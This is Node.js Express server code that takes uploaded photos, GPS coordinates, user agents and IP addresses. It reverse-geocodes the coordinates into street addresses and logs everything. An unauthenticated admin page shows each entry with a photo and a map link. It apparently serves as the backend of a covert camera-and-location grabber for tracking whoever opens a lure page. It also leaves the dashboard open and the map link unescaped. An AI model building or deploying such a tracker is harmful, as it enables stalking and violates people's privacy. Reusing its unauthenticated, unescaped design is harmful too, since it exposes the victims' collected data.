const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const cors = require("cors");
//const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: "10mb" }));

// Upload directory
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// Utility: escape HTML to prevent injection in dashboard
function escapeHtml(text) {
  if (!text) return "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

app.post("/upload", async (req, res) => {
  const { image, latitude, longitude, userAgent } = req.body;

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket.remoteAddress;

  if (!image) {
    return res.status(400).json({ error: "No image" });
  }

  try {
    // Save image
    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
    const filename = `photo_${Date.now()}.jpg`;
    fs.writeFileSync(
      path.join(uploadDir, filename),
      Buffer.from(base64Data, "base64")
    );

    // Reverse geocoding
    let address = "Address unavailable";
    if (latitude && longitude) {
      try {
        const geoRes = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`,
          {
            headers: { "User-Agent": "TestApp/1.0 (test@email.com)" }
          }
        );
        const geoData = await geoRes.json();
        address = geoData.display_name || address;
      } catch (err) {
        console.error("Reverse geocoding failed:", err.message);
      }
    }

    const mapsLink =
      latitude && longitude
        ? `https://www.google.com/maps?q=${latitude},${longitude}`
        : "N/A";

    const log = `
Time: ${new Date().toISOString()}
IP: ${ip}
Latitude: ${latitude}
Longitude: ${longitude}
Address: ${address}
Google Maps: ${mapsLink}
User-Agent: ${userAgent}
Image: ${filename}
----------------------------------
`;

    fs.appendFileSync("log.txt", log);

    res.json({ success: true });
  } catch (err) {
    console.error("Upload failed:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Admin dashboard without authentication
app.get("/admin", (req, res) => {
  let logsRaw;
  try {
    logsRaw = fs.readFileSync("log.txt", "utf-8").trim();
  } catch (err) {
    return res.status(500).send("Could not read log file");
  }

  let logs = logsRaw.split("----------------------------------").filter(Boolean);

  // Show only last 50 entries
  logs = logs.slice(-50);

  let html = `
    <html>
    <head>
      <title>Admin Dashboard</title>
      <style>
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; vertical-align: top; }
        img { max-width: 100px; max-height: 100px; }
        body { font-family: Arial, sans-serif; margin: 20px; }
      </style>
    </head>
    <body>
      <h2>Admin Dashboard (Last 50 Entries)</h2>
      <table>
        <tr>
          <th>Time</th>
          <th>IP</th>
          <th>Latitude</th>
          <th>Longitude</th>
          <th>Address</th>
          <th>Google Maps</th>
          <th>Photo</th>
        </tr>
  `;

  logs.forEach(log => {
    const time = escapeHtml(log.match(/Time: (.*)/)?.[1] || "");
    const ip = escapeHtml(log.match(/IP: (.*)/)?.[1] || "");
    const lat = escapeHtml(log.match(/Latitude: (.*)/)?.[1] || "");
    const lon = escapeHtml(log.match(/Longitude: (.*)/)?.[1] || "");
    const address = escapeHtml(log.match(/Address: (.*)/)?.[1] || "");
    const maps = log.match(/Google Maps: (.*)/)?.[1] || "";
    const image = escapeHtml(log.match(/Image: (.*)/)?.[1] || "");

    html += `<tr>
      <td>${time}</td>
      <td>${ip}</td>
      <td>${lat}</td>
      <td>${lon}</td>
      <td>${address}</td>
      <td><a href="${maps}" target="_blank" rel="noopener noreferrer">Map</a></td>
      <td>${image ? `<img src="/uploads/${image}" alt="User photo"/>` : ""}</td>
    </tr>`;
  });

  html += "</table></body></html>";
  res.set("Content-Type", "text/html");
  res.send(html);
});

app.use("/uploads", express.static(path.join(__dirname, "uploads")));

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Admin dashboard at http://localhost:${PORT}/admin`);
});
